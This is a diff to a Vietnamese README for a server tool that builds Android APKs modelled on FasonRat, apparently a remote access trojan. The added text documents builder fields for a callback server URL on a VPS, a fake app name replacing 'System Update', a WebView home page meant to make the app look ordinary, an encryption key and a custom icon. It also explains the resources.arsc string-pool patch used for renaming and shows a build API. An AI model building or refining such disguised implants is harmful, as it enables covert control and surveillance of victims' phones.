@@ -28,11 +28,31 @@ Không cần JDK, apksigner, zipalign hay Android SDK trên VPS.
   rồi mới tính EOCD + digest.
 - `minSdkVersion` đổi 21 → **24** vì APK chỉ có v2 (Android 5/6 không hiểu v2).
 
+## Ô nhập trong Builder (giống FasonRat)
+
+| Ô | Ý nghĩa |
+|---|---|
+| **server url** | `http://IP_VPS:7878` hoặc `IP:7878` (tự thêm scheme, tự tách host/port) |
+| **tên app** | tên hiện trên launcher — patch thẳng string pool trong `resources.arsc` |
+| **home page** | URL app mở khi khởi động (WebView) để trông như app thường; để trống = mở màn hình cài đặt |
+| **psk** | khoá mã hoá (dán từ `/etc/zekodroid.env`) |
+| **icon** | PNG thay icon |
+
+### Đổi tên app thế nào (arsc patch)
+
+`resources.arsc` có 1 global **string pool** ở đầu file. Server:
+1. đọc header pool (headerSize, stringCount, styleCount, flags UTF8/UTF16, stringsStart)
+2. đọc toàn bộ string, tìm chuỗi `System Update`
+3. thay bằng tên mới, dựng lại pool (offsets + data + styles) rồi **dịch toàn bộ phần sau pool**
+4. cập nhật `pool size` và `ResTable size`
+
+Kiểm chứng: `aapt2 dump badging` → `application-label:'Cloud Sync'`, `apksigner verify` → exit 0.
+
 ## API
 
 ```
 GET  /api/builder/info                 → {ready, basePath}
-POST /api/builder/build  {host, port, psk, icon?}
+POST /api/builder/build  {url | host+port, name?, home?, psk?, icon?}
      → APK (application/vnd.android.package-archive)
 ```
 
